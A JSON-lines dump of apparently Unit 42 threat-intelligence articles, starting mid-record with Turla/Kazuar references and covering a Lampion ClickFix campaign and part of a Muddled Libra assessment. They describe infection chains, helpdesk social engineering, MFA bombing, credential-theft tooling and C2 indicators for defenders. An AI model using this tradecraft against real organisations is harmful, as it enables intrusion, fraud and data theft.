pyR0/srVS0gOZbNdK3iK+GvekQVkBq8brOVCuN/XcCz4WLJod9GhivDYrDtMXF6ZMGHKa2zAcQ+v2vltYW3X2BYCZ1sblEznfIk+oHs+lesblfHVyPPXDcTLLf5IUuGE/dzeSpLhlWiFT/4MyeMLzU8QexpRkBn0qJkk5xWU0D09DN0SaNzA8E4grU61aaul5iNRYMO+qLXmtIJhrjUrnHNu7ZnZ+AQtc19Dhne1hciH4aj00HRLXsofWGWsELEhZv92cnQ0Rf9n00EGB591zDR8gAt3T5sSTQvjMGWOBHusfGV4ytmchmQWZ8QY7Fp4EPgn8vM48OR2z13qo4YSediAt9Af+YKGoPu2PU3szx08UwBZRz4cyYZB3zcFB8NxCx7Gki2rS5bYx1Z1cG/kU+Ri2gXYoCHgOz8umr+PDB+21V1pnmStxzWAdR7mK0e663LMxxAcZWjEArbt/BcIiZAkFsyoq+NJbuKTR2RYAW+4DXbxFQeGKnFBgle3u9ktcYXWqgJ8/rvs920rGf9k3br3I+2MtzrWglhRi/WkAmTrEIL4i1id0M0askl0YBHlzU9+Bgv2y/VsLH2UKQlp+owxGm1jequxwGpZfwxmWAMATe8L2qctVdXEOfT7Ue67AsVjkP/VmhbhGDO8zt38trylUhWnpUeYdkigg9Nxs1k= AQAB Additional References - Targeted Turla attacks (UAC-0024, UAC-0003) using CAPIBAR and KAZUAR malware [English version] – CERT-UA (Ukraine) - Kazuar: Multiplatform Espionage Backdoor with API Access – Unit 42, Palo Alto Networks - Researchers Find Links Between Sunburst and Russian Kazuar Malware – The Hacker News - Nation-state Turla resurfaces with a Sophisticated RAT – Cyberint (PDF) - Guid Struct (System) – Microsoft Learn - Technical Report about the Malware used in the Cyberespionage against RUAG – Swiss GovCERT - Turla renews its arsenal with Topinambour – Securelist, Kaspersky - Hunting Russian Intelligence “Snake” Malware – Cybersecurity Advisory, CISA - Indicator Removal: Timestomp, Sub-technique T1070.006 - Enterprise – MITRE ATT&CK - Swallowing the Snake’s Tail: Tracking Turla Infrastructure – Recorded Future - Carbon Paper: Peering into Turla’s second stage backdoor – WeLiveSecurity, ESET - Carbon, Software S0335 – MITRE ATT&CK - Threat Group Assessment: Turla (aka Pensive Ursa) – Unit 42, Palo Alto Networks","num_sentences":198,"metadata":{"source":"blog","platform":"Unit42","filename":"Kazuar’s-Nest"}}
{"id":81,"title":"Lampion Is Back With ClickFix Lures","publish_date":null,"link":"https://unit42.paloaltonetworks.com/lampion-malware-clickfix-lures/","clean_text":"Executive Summary Unit 42 researchers recently uncovered a highly focused malicious campaign targeting dozens of Portuguese organizations, particularly in the government, finance and transportation sectors.\nThis campaign was orchestrated by the threat actors behind Lampion malware, an infostealer that focuses on sensitive banking information.\nThis malware family has been active since at least 2019.\nDuring our investigation, we found that the group has added ClickFix lures to their arsenal.\nClickFix is a social engineering technique that multiple malware families have adopted since late 2024, which lures victims to copy and execute malicious commands on their machine, under the guise of fixing computer problems.\nThis campaign follows many of the same patterns as previous Lampion malware activity in terms of targets and infrastructure, as well as tactics, techniques and procedures (TTPs).\nThese included multiple, highly obfuscated Visual Basic (VB) scripts as part of the attack chain, and similarities in the initial social engineering themes.\nWhile the final payload was commented out in the activity we observed, we could otherwise determine the full infection chain, including loaders.\nIt is possible that a new wave of attacks could instead deliver the final payload.\nThe techniques and activities presented in this article highlight the importance of implementing enhanced detection capabilities to identify complex and obfuscated threats.\nPalo Alto Networks customers are better protected from the threats described here through the following products and services: If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n| Related Unit 42 Topics | PowerShell, VBScript | Technical Analysis of the Lampion Campaign Between late 2024 and early 2025, we noticed an increase in attacks against Portuguese companies.\nIn the process of examining our telemetry, we noticed one campaign in particular that demonstrated unusual size and focus.\nAlthough the campaign used several measures to evade traditional detection mechanisms, we successfully identified and disrupted the infection chain.\nThis campaign can be linked to Lampion banking malware, an infostealer that focuses on sensitive banking information.\nFor example, the C2 server used in this campaign is the same server that was used in successful Lampion infections in the past.\nFurthermore, we found the same TTPs being used as in past Lampion campaigns: multiple, highly obfuscated VB scripts, indirect execution of consecutive stages, and similar initial infection lure subjects.\nInfection Chain Analysis: A Long and Winding Road The campaign’s infection chain began with a phishing email that contains a malicious ZIP file attachment.\nAn HTML file within this ZIP file redirects the victim to autoridade-tributaria[.]com, a website mimicking a legitimate Portuguese tax authority.\nUpon going to the website, the victim is then presented with a fake document or software installation page that prompts them to copy a malicious PowerShell command and execute it in the Run dialog.\nThis command includes a comment in Portuguese: “#Habilitar Visualização de ficheiro” (this translates to “Enable File Preview” in English).\nThis is shown at the end of the code snippet below.\nThis command is the heart of the ClickFix fraud, which is a technique that is being used by various crimeware strains such as Lumma Stealer and NetSupport RAT — and now also Lampion.\nWhen an attacker uses ClickFix in a social engineering attack, the victim is prompted to copy malicious commands to their Run dialog or terminals to “fix” a certain problem.\nThis technique manipulates the victim into running a malicious command that infects their machine.\nThe victim’s execution of the malicious PowerShell command downloads and executes an obfuscated Visual Basic Script (VBS) file, which is part of this campaign.\nFigure 1 depicts the infection chain below.\nAnother interesting aspect of Lampion’s infection chain is that it is divided into several non-consecutive stages, executed as separate processes.\nThis dispersed execution complicates detection, as the attack flow does not form a readily identifiable process tree.\nInstead, it comprises a complex chain of individual events, some of which could appear benign in isolation.\nIn the next section, we take a deep dive into the VBS infection chain, which combines multiple obfuscation and bloating techniques that attackers implemented in these scripts.\nAnalysis of Stages 1 and 2: Initial VBS Downloaders The first and second stages of this campaign have several different versions, mainly varying in size and filenames.\nOverall, both use multiple obfuscation methods such as junk variables and indirect ASCII conversions to bloat the original code to a significant size.\nThis type of obfuscation hinders the work of both defenders and analysts, by obscuring the script’s main functionality.\nOnce the first stage is executed, it writes a similarly obfuscated second-stage downloader in the %TEMP% folder.\nTo further thwart detection, the first stage does not directly execute the second but rather creates a hidden scheduled task to be triggered at a random time.\nThe sole function of the second stage is to download yet another VBS stager from a cloud-hosted server.\nThis stager is disguised as a PHP file, a technique used repeatedly throughout this campaign.\nFigure 2 shows a deobfuscated code snippet from the first stage responsible for writing the second stage.\nAnalysis of Stage 3: The Final VBS Payload The third VBS stands out due to its large size (between 30 MB and 50 MB).\nAlthough it is filled with junk variables and obfuscated functions, this stage is also more robust in its functions.\nThe third stage VBS is in charge of reconnaissance and detection evasion maneuvers, such as: - Checking for existing security products using Windows Management Instrumentation (WMI) - Discerning whether the victim’s machine is a sandbox or virtual machine (VM) - Gathering initial data on the targeted endpoint, including a unique MD5 value of a victim ID, Base64-encoded under the GET request parameter dados= (“data” in Portuguese) - Sending the encoded ID to the cloud-hosted command-and-control (C2) server Figure 3 depicts the process tree generated during stage 3 execution.\nSimilar to the previous stages, the third stage does not directly execute the fourth stage but instead creates a complex execution method: - First, it writes the content of the command shown in Figure 3 into a .cmd file in the Windows startup folder and names it after the victim’s hostname - Afterwards, the script creates a hidden scheduled task that forces the system to shut down - The shutdown triggers the execution of the .cmd file during the subsequent startup, ultimately launching the fourth-stage DLL loader with rundll32.exe We believe the threat actor reuses this stage across multiple campaigns with varying infection vectors.\nBy looking at the comments present in the script, we can see a decoded version of a curl command that was supposed to download the final Lampion payload from the attacker’s C2.\nSince the attacker deactivated the command for downloading the payload by placing it within a comment block, the final Lampion payload was not downloaded in this campaign.\nFurthermore, the attacker left other comments that revealed the script’s functionality in Portuguese (such as “obtain information on antivirus software,” shown in Figure 5).\nDespite their many efforts to obfuscate code, in certain cases the attacker kept an unencoded version of some of the commands that the code executed.\nThese are translated into natural language and placed in comments, as shown in Figure 6.\nAnalysis of Stage 4: The Loader DLL After exfiltrating initial reconnaissance data, the third stage VBScript tries to download the fourth stage — a DLL loader — from another cloud-hosted address that redirects to hxxps://inde-faturas[.]com/54879878.\nThe fourth stage DLL’s name is generated from the infection timestamp, in YYYYMMDDHHmmSS format (e.g., 20241201120101.dll).\nThis loader variant is also extremely large, at over 700 MB.\nThis makes it impossible for people to upload to crowd-sourced threat intelligence platforms, thus increasing the difficulty for defenders.\nAs outlined above, the DLL is triggered by rundll32.exe, which calls a different export function for each unique victim.\nAll functions are usually words in Portuguese, unlike past campaigns in which the fourth stage was triggered by a randomized function name.\nUnlike previous campaigns that downloaded the fourth stage along with a zipped Lampion payload, this campaign only downloads the aforementioned DLL.\nThis could indicate either a mistake on the attacker’s part or a testing phase for the next wave of attacks.\nThe commented-out commands relating to the .zip payload download suggest incomplete or incorrect content.\nConclusion We recently detected a campaign that targets Portuguese-speaking individuals and organizations in various sectors, including government, finance and transportation.\nThis campaign aligns with TTPs and indicators that Lampion used in the past.\nIt also shows the group’s adaptation of a new initial attack vector: ClickFix lures.\nThe increasing prevalence of ClickFix, coupled with low awareness of its risks, poses a significant threat.\nWe advise security practitioners to proactively address this evolving threat by: - Increasing awareness by educating personnel to be wary of ClickFix lures - Setting up defense and monitoring measures for PowerShell scripting and clipboard activity Palo Alto Networks Protection and Mitigation Palo Alto Networks customers are better protected from the Lampion attack vector through Cortex XDR and XSIAM.\nCortex XDR VBS Local Analysis Module and Advanced WildFire classify the Lampion VBS loader samples discussed in this article as malicious.\nAdvanced URL Filtering and Advanced DNS Security identify known URLs and domains associated with ClickFix campaigns as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) - UK: +44.20.3743.3660 - Europe and Middle East: +31.20.299.3130 - Asia: +65.6983.8730 - Japan: +81.50.1790.0200 - Australia: +61.2.4062.7950 - India: 00080005045107 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nAppendix A Detection With Cortex XDR VBS Local Analysis Module The new Cortex XDR VBS Local Analysis Module provides enhanced detection capabilities to identify complex and obfuscated VBS threats.\nIn the campaign described above, several rules were triggered by malicious activity originating from impacted endpoints.\nFigure 7 below depicts alerts that were triggered due to the execution of malicious VBScripts as part of the attack.\nIndicators of Compromise Phishing Email - ee4c8e4cce55bd40afa1fb0bc0eee3d7c23d0ebe2db48c2092e854f6ca1472ce Stage 1 VBS - 4aeb84dd71588a35084109ff5525c7bff2f30e0ed58ce139621b17f2374bdb35 Stage 2 VBS - bba48cf24bb9e6bdcbc79c2241f101e3dd4127ab450e3dbbe1b79fa738f06483 - 29b63fcf8e5f08fd12166507b3a85746e3ec685ae0620a124e64125ecd9ccf9b Stage 3 VBS - 58fe2a7d4435c9c24c98d33aff1110add4bf95add31558f51289a028ddafcc6e - 334dfbaefbf7e6301d2385f95d861eb6dae9018c48fb298a2cbf5f364fbcdb2d - 1681c3b88ed315543ac1bf07d258d560cf2f85bfd26c10471d71700eaeb57fb3 Lampion C2 Stage 4 Loader - 5.8.9[.]77 - 83.242.96[.]159 Domains - Inde-faturas[.]com - autoridade-tributaria[.]com C2 URLs - http://18.116.63[.]61/ifeellike.php - http://18.116.63[.]61/trogloditas.php - http://3.135.249[.]199/prayfor.php - http://18.217.122[.]187/proposito.php - http://18.226.150[.]56/persistir.php - http://3.142.40[.]36/grow.php - http://18.216.78[.]94/aceitalo.php - http://3.23.103[.]13/stick.php C2 IPv4 Addresses (Cloud-Hosted) - 18.221.69[.]167 - 18.222.97[.]143 - 18.116.15[.]129 - 18.220.96[.]58 - 3.135.200[.]135 - 18.191.192[.]110 - 18.224.38[.]123 - 18.118.163[.]100 - 3.147.127[.]14 - 3.138.32[.]196 - 18.117.11[.]70 - 18.117.173[.]119 - 18.116.28[.]153 - 3.16.76[.]203 - 3.15.7[.]241 - 3.15.155[.]141 - 18.117.71[.]203 - 3.133.160[.]140 - 3.133.113[.]215 - 3.143.24[.]42 - 18.217.180[.]185 - 3.23.105[.]171 - 3.142.200[.]117 - 3.128.34[.]187 - 18.191.240[.]233 - 3.147.86[.]100 Additional Resources - Lumma Stealer ClickFix Distribution – eSentire - Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape – ProofPoint - ClickFix: The Social Engineering Technique Hackers Use to Manipulate Victims – Group-IB - New Lampion Variant In The Wild [PDF] – SOC8 Technical Report, Layer8 - Targeting Portugal: A new trojan ‘Lampion’ has spread using template emails from the Portuguese Government Finance & Tax – Segurança Informática - Data Obfuscation: Junk Data – MITRE ATT&CK","num_sentences":71,"metadata":{"source":"blog","platform":"Unit42","filename":"Lampion"}}
{"id":82,"title":"Threat Group Assessment: Muddled Libra (Updated May 16, 2025)","publish_date":null,"link":"https://unit42.paloaltonetworks.com/muddled-libra/","clean_text":"Executive Summary Update May 16, 2025: We’ve added an additional section to this article that describes the evolution of Muddled Libra activity since the beginning for 2024.\nThis group is a dynamic one, and as members cycle in and out of the group, its knowledgebase and skill set naturally shift.\nIts toolbox has now expanded to include: - Social engineering of both end users and helpdesks - Traditional phishing - Inside access to business process outsourcers - Ransomware affiliations for extortion Muddled Libra stands at the intersection of devious social engineering and nimble technology adaptation.\nWith an intimate knowledge of enterprise information technology, this threat group presents a significant risk even to organizations with well-developed legacy cyber defenses.\nMuddled Libra’s tactics can be fluid, adapting quickly to a target environment.\nThey continue to use social engineering as their primary modus operandi, targeting a company's IT help support desk.\nFor example, in under a few minutes, these threat actors successfully changed an account password and later reset the victim’s MFA to gain access to their networks.\nMuddled Libra was first noted for targeting organizations in the software automation, outsourcing and telecommunications verticals.\nSince then, they’ve expanded their targeting to include the technology, business process outsourcing, hospitality and more recently, financial industries.\nThey show no signs of slowing.\nUnit 42 researchers and responders have investigated interrelated incidents from mid-2022 through the beginning of 2024, which we’ve attributed to the threat group Muddled Libra.\nInitial attacks were highly structured and favored large business process outsourcing firms serving high-value cryptocurrency holders.\nWe believe that when the threat actors exhausted those targets, they evolved into a ransomware affiliate model with extortion as their key objective.\nIn the cases we’ve been involved with, we observed Muddled Libra performing the following activities: - Using NSOCKS and TrueSocks proxy services - Creating email rules to forward emails from specific security vendors to the actors to monitor communications and those helping in the investigation - Deploying a custom virtual machine into the environment - Using an open-source rootkit, bedevil (bdvl) to target VMware vCenter servers - Gaining administrative permissions - Heavy use of anonymizing proxy services We also believe that members of Muddled Libra speak English as a first language, which provides them greater ability to conduct their social engineering attacks with other English speakers.\nMuddled Libra has also been observed using AI to spoof victims’ voices.\nSocial media videos can be used by attackers to train AI models.\nThe targets we’ve observed seem to be primarily in the U.S. Thwarting Muddled Libra requires interweaving tight security controls, diligent awareness training and vigilant monitoring.\nPalo Alto Networks customers are better protected from the threats described in this article through a modern security architecture built around Cortex XSIAM in concert with Cortex XDR.\nThe Advanced URL Filtering and DNS Security Cloud-Delivered Security Services can help protect against command and control (C2) infrastructure, while App-ID can limit anonymization services allowed to connect to the network.\n| Related Unit 42 Topics | Muddled Libra (related to Scattered Spider, Scatter Swine), 0ktapus, Social Engineering | Update May 16, 2025 After a lull in late 2024, Muddled Libra resumed activity.\nUnit 42 has responded to multiple high-profile attacks, while observing even more attributed to Muddled Libra's parent group, Scattered Spider.\nNotably, these attacks expand on trade craft pioneered by Muddled Libra.\nMuddled Libra is a subset of a loosely affiliated threat collective known as Scattered Spider, Octo Tempest, Oktapus and other names.\nScattered Spider’s resilience lies in the breadth and diversity of its members.\nThis group evolved in the Discord and Telegram communication platforms, drawing in members from diverse backgrounds and interests.\nAttackers in this group specialize in specific skill sets and work together to hone those skills to eventually sell or use in cyberattacks.\nChannels used by members range from crime-oriented groups like one they call The COM, to enthusiast collectives for popular online games.\nMuddled Libra's core members originally specialized in SIM-swapping, smishing and insider knowledge of IT systems management software.\nAs members cycle in and out of the group, it gains new skills and sunsets less effective ones.\nThe group's toolbox has expanded to include social engineering of both end users and helpdesks, traditional phishing, inside access to business process outsourcers and ransomware affiliations.\nThe loose-knit and fluid nature of this group makes it inherently difficult to disrupt.\nMuddled Libra (see Unit 42’s Threat Assessment and research on attacks against CSPs) has seen several key members arrested over the past year.\nHowever, others with new skills and inside knowledge of new industries have quickly moved in to take their place, and still others have formed entirely new threat clusters.\nUnit 42 has observed new offshoots with unique objectives forming to expand into previously untouched industries.\nThese new groups are using a mix of well worn and novel techniques.\nHeavily targeted industries include retail and hospitality.\nHowever, favored industries and organizations can shift on a whim, and defenders in every vertical should bolster their cyber defenses against these attacks.\nInitial access has shifted away from smishing to social engineering.\nThreat actors direct social engineering attacks at helpdesks by posing as employees who have forgotten their passwords or at employees directly, with attackers claiming to be from the corporate helpdesk.\nOnce inside the environment, attackers have leveraged free or compromised legitimate remote management tools to access customer relationship management (CRM) platforms for sensitive data exfiltration.\nMuddled Libra attacks have also featured virtual environment administration tools for maximum disruption.\nThis group has a new affiliation with the ransomware-as-a-service group DragonForce for extortion.\nThreat Overview The attack style defining Muddled Libra appeared on the cybersecurity radar in late 2022 with the release of the 0ktapus phishing kit.\nThis malware kit offered the following features: - A prebuilt hosting framework - Easy C2 connectivity - Bundled attack templates These options allowed attackers to emulate mobile authentication pages cheaply and easily.\nWith over 200 realistic fake authentication portals and some targeted smishing, attackers quickly gathered credentials and multifactor authentication (MFA) codes for over one hundred organizations.\nThe speed and breadth of these attacks caught many defenders off-guard.\nWhile smishing is not a new tactic, the 0ktapus framework commoditized what would typically require complex infrastructure and advanced technical skills, in a way that granted even low-skilled attackers a high attack success rate.\nThe sheer number of targets being hit with this kit created a fair amount of confusion regarding attribution in the research community.\nPrevious reporting by Group-IB, CrowdStrike and Okta has documented and mapped many of these attacks to the following intrusion groups: 0ktapus, Scattered Spider and Scatter Swine.\nWhile these have been frequently treated as several names for one group, what these names actually define are: - An attack style using a common toolkit - A social forum-based collaboration network - An Agile-like team structure Muddled Libra is a distinct group of actors using this tradecraft.\nIn a 2023 blog posted on ALPHV’s leak site, the attackers corroborated this view, claiming that previous researcher attribution models have been non-specific.\nDuring Unit 42 Incident Response investigations, we identified several cases we attribute to Muddled Libra.\nMuddled Libra has been responsible for a campaign of complex supply chain attacks, ultimately leading to high-value cryptocurrency targets.\nThis group has only intensified their campaign.\nThey are shifting tactics to adapt to improving cyber defenses, and they are targeting to broaden their attack scope.\nUnit 42 has observed an extensive toolkit used in these attacks.\nThis arsenal ranges from hands-on social engineering and smishing attacks to proficiency with niche penetration testing, forensics tools and even legitimate systems management software.\nThis breadth of tooling gives Muddled Libra an edge over even a robust and modern cyber defense plan.\nIn incidents the Unit 42 team has investigated, Muddled Libra has been methodical in pursuing its goals and highly flexible with attack strategies.\nWhen an attack tactic is blocked, they have either rapidly pivoted to another vector or modified the target environment to enable their favored path.\nMuddled Libra has also repeatedly demonstrated a strong understanding of the modern incident response (IR) framework.\nThis knowledge allows them to continue progressing toward their goals even as incident responders attempt to expel them from an environment.\nOnce established, this threat group is difficult to eradicate.\nUnit 42 has observed them joining IR war rooms and creating rules within email security platforms to intercept and redirect incident response-related communication.\nInitially, Muddled Libra preferred targeting a victim’s downstream customers using stolen data and, if allowed, would return repeatedly to the well to refresh their stolen dataset.\nUsing this stolen data, the threat actor could return to prior victims even after the initial incident response.\nFurthermore, Muddled Libra appeared to have clear goals for its breaches versus just capitalizing on opportunistic access.\nThey rapidly sought and stole information on downstream client environments and then used it to pivot into those environments.\nIn a notable departure from earlier tactics, in 2023, intelligence indicated that Muddled Libra joined the ALPHV/Blackcat ransomware-as-a-service affiliate program.\nThey wasted no time implementing this new tool set with a radical departure from previous tradecraft in favor of new attacks focused on data theft, encryption and enormous extortion demands.\nThe U.S. Justice Department interrupted ALPHV’s operations shortly after these attacks began.\nSince this action, new Muddled Libra attacks have shifted to data theft with a simple extortion objective.\nMuddled Libra has demonstrated a strong understanding of their victims’ “line of business” processes, and they strike at the heart of business operations.\nAttack Chain While each incident is unique, Unit 42 researchers have identified enough commonalities in tradecraft to attribute multiple incidents to Muddled Libra.\nFigure 1 shows the attack chain.\nWe have mapped these to the MITRE ATT&CK® framework, summarized below.\nReconnaissance Muddled Libra has consistently demonstrated an intimate knowledge of targeted organizations, including employee lists, job roles and cellular phone numbers.\nIn some instances, threat actors likely obtained this data during earlier breaches against upstream targets.\nThreat actors also frequently obtain information packs from illicit data brokers such as the now-defunct Genesis and Russian Markets.\nThis data is typically harvested from corporate and personal infected devices using malware such as Raccoon Stealer and RedLine Stealer.\nWith the early advent of bring-your-own-device (BYOD) policies and the popularity of hybrid work solutions, corporate data and credentials are frequently used and cached on personal devices.\nDecentralizing the management and protection of IT assets creates a lucrative targeting opportunity for information-stealing malware.\nResource Development Lookalike domains used in smishing attacks are a consistent hallmark for Muddled Libra.\nThis tactic is effective since mobile devices frequently truncate links in SMS messages.\nMalicious domain names frequently use the format of the organization name with a hyphen, followed by a service (like SSO, helpdesk or HR).\nEarly clusters of attacks attributed to the 0ktapus campaign consistently used domains registered via Porkbun or Namecheap and hosted on Digital Ocean infrastructure.\nThese domains are short-lived, used only during the initial access phase, and they are quickly taken down before defenders can investigate.\nRecently, we’ve observed Muddled Libra adding Metaregistrar and Hosting Concepts to their preferred registrar list, and their hosting has moved behind a large content delivery network (CDN) service.\nIn many investigations, Unit 42 observed the use of the 0ktapus phishing kit for credential harvesting.\nGroup-IB has done a great deep dive analysis of this versatile kit, which is widely available in the criminal underground.\nIt requires little skill to stand up and configure, making it an ideal tool for highly targeted smishing attacks.\nSince its introduction, other threat groups have adopted this kit, and it continues to evolve.\nInitial Access In all incidents where Unit 42 could determine an initial access vector, smishing and helpdesk social engineering were involved.\nIn most early incidents, the threat actor sent a lure message directly to the targeted employees’ cellphones, claiming they needed to update account information or reauthenticate to a corporate application.\nMessages contained a link to a spoofed corporate domain designed to emulate a familiar login page.\nLikely due to organizations’ large-scale phase-out of SMS as a secondary authentication factor, Muddled Libra has begun to move away from smishing as an initial entry vector.\nNew cases indicate that this group pervasively uses direct social engineering.\nHelpdesk and customer service agents are particularly high-value targets.\nUnit 42 has observed Muddled Libra using a combination of open-source intelligence and previously compromised sensitive data to get help desk agents to reset both passwords and MFA on the same call.\nThese attacks are convincing and persistent.\nThey focus on wearing the agent’s defenses down, running up the call length and ultimately bypassing security restrictions that could have prevented these attacks.\nPersistence Muddled Libra was particularly focused on maintaining access to targeted environments.\nWhile threat actors commonly use a free or demo version of a remote monitoring and management (RMM) tool during intrusions, Muddled Libra often installed half a dozen or more of these utilities.\nThey did this to ensure they would maintain a backdoor into the environment even if one were discovered.\nUsing commercial RMM tools is particularly problematic as these tools are legitimate, business-critical applications that Muddled Libra abuses.\nNone of these tools are inherently malicious and they are frequently used in the day-to-day administration of many enterprise networks.\nDefenders should weigh the risks of an outright block versus carefully monitoring their use.\nObserved tools included Zoho Assist, AnyDesk, Splashtop, TeamViewer, ITarian, FleetDeck, ASG Remote Desktop, RustDesk and ManageEngine RMM.\nUnit 42 recommends organizations block by signer any RMM tools that they have not sanctioned for use within the enterprise.\nMuddled Libra has also demonstrated familiarity with cloud platforms, both hosted and software as a service (SaaS).\nThey will use these platforms to establish a foothold within the organization, as these resources are unlikely to be monitored like traditional assets and systems.\nUnit 42 has a separate article with much more detail on cloud targeting.\nNotably, recent attacks indicate that long-term persistence is no longer this group’s primary objective.\nInstead, they’ve moved to a more traditional “encrypt and extort” model.\nTargeting has broadened to include large organizations more likely to have the capability to pay large ransoms.\nOnce this group learns and understands the infrastructure and software used in an industry, they tend to target other organizations in the same vertical.\nDefense Evasion Demonstrating proficiency with many security controls, Muddled Libra evaded common defenses.\nTheir tactics have included the following: - Disabling antivirus and host-based firewalls - Attempting to delete firewall profiles - Creating defender exclusions - Deactivating or uninstalling EDR and other monitoring products - Standing up unmanaged cloud virtual machines - Elevating access in virtual desktop environments Attackers also re-enabled and used existing Active Directory accounts to avoid triggering common security information and event management (SIEM) monitoring rules.\nWe also observed them operating within endpoint detection and response (EDR) administrative consoles to clear alerts.\nWe cover this attack in detail in our article.\nMuddled Libra has been careful with operational security, consistently using commercial virtual private network (VPN) services to obscure their geographic location and attempt to blend in with legitimate traffic.\nThe group preferred Mullvad VPNin early incidents Unit 42 researchers investigated, but we also observed multiple other vendors, such as ExpressVPN, NordVPN, Ultrasurf, Easy VPN and ZenMate.\nUnit 42 researchers have more recently observed the usage of rotating residential proxy services as well.\nAs reported by Brian Krebs in 2021, residential proxy services typically hide their code inside browser extensions, allowing operators to lease out residential connections for legitimate and malicious use alike.\nDefenders should look for multiple users authenticating from new residential IPs over short periods.\nCredential Access Once attackers captured the credentials they would use for initial access, the attacker took one of two paths.\nIn one case, they continued with the authentication process from a machine they controlled and immediately requested a MFA code.\nIn the other cases, they generated an endless string of MFA prompts until the user accepted one out of fatigue or frustration (aka MFA bombing).\nIn cases where MFA bombing was unsuccessful, the threat actor contacted the organization’s help desk, claiming to be the victim.\nThey would then state that their phone was inoperable or misplaced and would request to enroll a new, attacker-controlled MFA authentication device.\nMuddled Libra’s social engineering success is notable.\nAcross many cases, the group demonstrated unusually high comfort in engaging the help desk and other employees over the phone, convincing them to engage in unsafe actions.\nIf targeted accounts do not have the desired access, Muddled Libra will use the account for discovery and repeat the process until they have the access necessary for their attack.\nAfter establishing a foothold, Muddled Libra moves quickly to elevate access.\nStandard credential-stealing tools employed in this phase included Mimikatz, ProcDump, DCSync, Raccoon Stealer and LAPS Toolkit.\nWhen the group could not quickly locate elevated credentials, they turned to Impacket, MIT Kerberos Ticket Manager and NTLM Encoder/Decoder.\nIn some incidents, Muddled Libra employed specialized tools to search memory contents for credentials directly using MAGNET RAM Capture and Volatility.\nAs these are legitimate forensics tools that Muddled Libra is abusing, defenders should carefully consider the downsides to blocking them, including the possibility of security team activity generating false positive alerts.\nThis tactic raises an important flag for defenders.\nEven though user accounts might be protected through privileged access management, endpoints often have elevated credentials cached for system management or to run services.\nCare should be taken to ensure that privileged credentials only have the permissions necessary to perform their intended functions and are closely monitored for deviations from normal behavior.\nDiscovery Muddled Libra’s discovery methods were consistent from case to case.\nIn our investigations, the group used well-known, legitimate penetration testing tools to map the environment and identify targets of interest.\nTheir toolkit included SharpHound, ADRecon, AD Explorer, Angry IP Scanner, Angry Port Scanner and CIMplant.\nMuddled Libra also proved proficient with commercial systems administration tools such as ManageEngine, LANDESK and PDQ Inventory for discovery and automation.\nThey also used VMware PowerCLI and RVTools in virtual environments.\nDefenders should be vigilant in identifying unsanctioned network scanning and unusual rapid access to multiple systems or access that crosses logical business segments.\nExecution In early incidents, Muddled Libra appeared primarily interested in data and credential theft, and we infrequently saw remote execution.\nHowever, more recent cases included a BlackCat ransomware component.\nWhen needed, the group accomplishes execution with Sysinternals PsExec or Impacket.\nWe also observed Muddled Libra using the victim’s system management tools to execute malicious code.\nThey used captured credentials or authentication hashes for privilege elevation.\nLateral Movement Muddled Libra preferred using remote desktop protocol (RDP) connections from compromised computers for lateral movement inside the target environment.\nThis approach helps to minimize discoverable external network artifacts in logs that could alert defenders and help investigators with attribution.\nCollection Muddled Libra is familiar with typical enterprise data management.\nThey’ve successfully located sensitive organizational data in a wide range of common data repositories, both structured and unstructured, including the following: - Confluence - Code Management Platforms - Elastic - Microsoft Office 365 suite (e.g., SharePoint, Outlook) - Internal messaging platforms They also targeted data in the victim’s environment from typical service desk applications like Zendesk and Jira.\nMined data included credentials for further compromise and they directly targeted sensitive and confidential information.\nUnit 42 researchers observed Muddled Libra using the open-source data mining tool Snaffler and native tools to search registries, local drives and network shares for keywords like *password*, and securestring.\nThreat actors then staged compromised data and archived it for exfiltration using WinRAR or PeaZip.\nThey used stolen sensitive data as leverage in extortion demands.\nDefenders should regularly perform keyword searches in their environments to identify improperly stored data and credentials as part of a broader data management and classification strategy.\nExfiltration In several cases, Muddled Libra attempted to establish reverse proxy shells or secure shell (SSH) tunnels for command and control exfiltration.\nWe observed them using tunneling software such as RSocx.\nMuddled Libra also used common file transfer sites such as put[.]io, transfer[.]sh, wasabi[.]com, or gofile[.]io to both exfiltrate data and pull down attack tools.\nWe also observed the use of Cyberduck as a file transfer agent.\nThreat actors often abuse, take advantage of or subvert legitimate products such as Cyberduck for malicious purposes.\nThis does not necessarily imply a flaw or malicious quality to the legitimate product being abused.\nImpact The early impact directly observed by Unit 42 was some combination of the theft of sensitive data and Muddled Libra leveraging trusted organizational infrastructure for follow-on attacks on downstream customers.\nLater attacks were much more destructive, and they included the following activities: - Disruption of operations - Damage to sensitive systems - Encryption of critical data - Enormous extortion demands Conclusion and Mitigations Muddled Libra is a methodical adversary that substantially threatens enterprise organizations across many industries.\nThey are proficient in a range of security disciplines, able to thrive in relatively secure environments and execute rapidly to complete devastating attack chains.\nMuddled Libra doesn’t bring anything new to the table except for the uncanny knack of stringing together weaknesses to disastrous effect.\nDefenders must combine cutting-edge technology, comprehensive security hygiene and external threats and internal events monitoring.\nThe high-stakes risk of operational disruption and loss of sensitive data is a strong incentive for modernizing information security programs.\nIn addition to the mitigation recommendations included in the Attack Chain subsections above, we recommend organizations: - Implement MFA and single sign-on (SSO) wherever possible – preferably Fast Identity Online (FIDO).\nIn the cases we investigated, Muddled Libra was most successful when they convinced employees to help them bypass MFA.\nWhen they could not quickly establish a foothold, they appeared to move on to other targets. -\nDefenders should consider implementing security alerting and account lockout on repeated MFA failures. -\nImplement comprehensive user awareness training.\nMuddled Libra is heavily focused on social engineering help desk and other employees via phone and SMS.\nEmployee training on identifying suspicious non-email-based outreach is critical. -\nIn case of a breach, assume this threat actor knows the modern IR playbook.\nConsider setting up out-of-band response mechanisms. -\nEnsure credential hygiene is up to date.\nOnly grant access when and for as long as necessary. -\nMonitoring and managing access to critical defenses and controls is essential to defending against skilled attackers.\nRights should be restricted to only what is necessary for each job function.\nIdentity threat detection and response (ITDR) tools such as Cortex XDR and Cortex XSIAM should be used to monitor for abnormal behavior. -\nDefenders should limit anonymization services allowed to connect to the network, ideally at the firewall by App-ID.\nTo defend against the threats described in this blog, Palo Alto Networks further recommends that organizations employ the following capabilities: - Network security: delivered through a Next-Generation 